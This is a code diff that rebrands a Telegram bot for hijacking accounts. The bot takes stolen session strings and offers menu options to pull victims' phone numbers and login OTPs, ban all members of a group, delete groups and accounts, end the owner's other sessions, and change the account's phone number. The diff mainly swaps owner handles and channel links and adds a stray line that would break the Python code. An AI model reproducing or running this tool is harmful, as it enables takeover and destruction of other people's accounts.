@@ -373,36 +373,36 @@ logging.basicConfig(level=logging.WARNING)
 channel = "LegendBot_AI"
 menu = '''
 
-"A" :~ [Check user own groups and channels]
+"𝗔" :~ [Check user own groups and channels]
 
-"B" :~ [Check user all information like phone number, usrname... etc]
+"𝗕" :~ [Check user all information like phone number, usrname... etc]
 
-"C" :~ [Ban a group {give me StringSession and channel/group username i will ban all members there}]
+"𝗖" :~ [Ban a group {give me StringSession and channel/group username i will ban all members there}]
 
-"D" :~ [Know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
+"𝗗" :~ [Know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
 
-"E" :~ [Join A Group/Channel via StringSession]
+"𝗘" :~ [Join A Group/Channel via StringSession]
 
-"F" :~ [Leave A Group/Channel via StringSession]
+"𝗙" :~ [Leave A Group/Channel via StringSession]
 
-"G" :~ [Delete A Group/Channel]
+"𝗚" :~ [Delete A Group/Channel]
 
-"H" :~ [Check user two step is eneable or disable]
+"𝗛" :~ [Check user two step is eneable or disable]
 
-"I" :~ [Terminate All current active sessions except Your StringSession]
+"𝗜" :~ [Terminate All current active sessions except Your StringSession]
 
-"J" :~ [Delete Account]
+"𝗝" :~ [Delete Account]
 
-"K" :~ [Promote a member in a group/channel]
+"𝗞" :~ [Promote a member in a group/channel]
 
-"L" ~ [Demote all admins in a group/channel]
+"𝗟" ~ [Demote all admins in a group/channel]
 
-"M" ~ [Change Phone number using StringSession]
+"𝗠" ~ [Change Phone number using StringSession]
 
-I will add more features Later 😅
+I will add more features Later 😁
 '''
 mm = '''
-**⚜NOTICE FIRST JOIN LEGEND GROUP @LegendBot_AI⚜**
+**⚜NOTICE FIRST JOIN G-NETWORK GROUP @RJbr0⚜**
 '''
 
 keyboard = [
@@ -427,7 +427,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("Owner", "https://t.me/LegendBoy_XD")
+    Button.url("Owner", "https://t.me/DarkLightHacker")
     ]
 ]
 
@@ -444,7 +444,7 @@ async def op(event):
   else:
     legendbye = [
       [
-        Button.url("Must Join", f"https://t.me/LegendBot_AI")
+        Button.url("Must Join", f"https://t.me/Rjbr0")
         ]
       ]
     await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=legendbye)
@@ -485,7 +485,7 @@ async def start(event):
         Button.inline("N", data="N"),
         ],
       [
-        Button.url("Owner", "https://t.me/LegendBoy_XD")
+        Button.url("Owner", "https://t.me/DarkLightHacker")
         ]
     ]
     await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)
@@ -506,12 +506,12 @@ async def users(event):
         return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @LegendBoy_XD")
+        file.write(i + "\n\nDetails BY @DarkLightHacker")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using LegendBoyBot. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nThanks For using @DarkLightHackerBot. \n/hack", buttons=keyboard)
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -524,7 +524,7 @@ async def users(event):
     else:
       return await event.respond("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nThanks For using @DarkLightHackerBot.\n/hack", buttons=keyboard)
     
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -552,7 +552,7 @@ async def users(event):
       else:
         return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using LegendBoy Bot", buttons=keyboard)
+      await event.reply(i + "\n\nThanks For using @DarkLightHackerBot", buttons=keyboard)
     
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -568,7 +568,7 @@ async def users(event):
     await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
     grpid = await x.get_response()
     await joingroup(strses.text, grpid.text)
-    await event.reply("Joined the Channel/Group Thanks For using LegendBoy Bot", buttons=keyboard)
+    await event.reply("Joined the Channel/Group Thanks For using @DarkLightHackerBot", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
 async def users(event):
@@ -583,7 +583,7 @@ async def users(event):
     await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
     grpid = await x.get_response()
     await leavegroup(strses.text, grpid.text)
-    await event.reply("Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard)
+    await event.reply("Leaved the Channel/Group Thanks For using @DarkLightHackerBot,", buttons=keyboard)
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
@@ -597,8 +597,8 @@ async def users(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using LegendBoyBot.", buttons=keyboard)
-
+      await event.reply("Deleted the Channel/Group Thanks For using @DarkLightHackerBot.", buttons=keyboard)
+LegendBoy
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
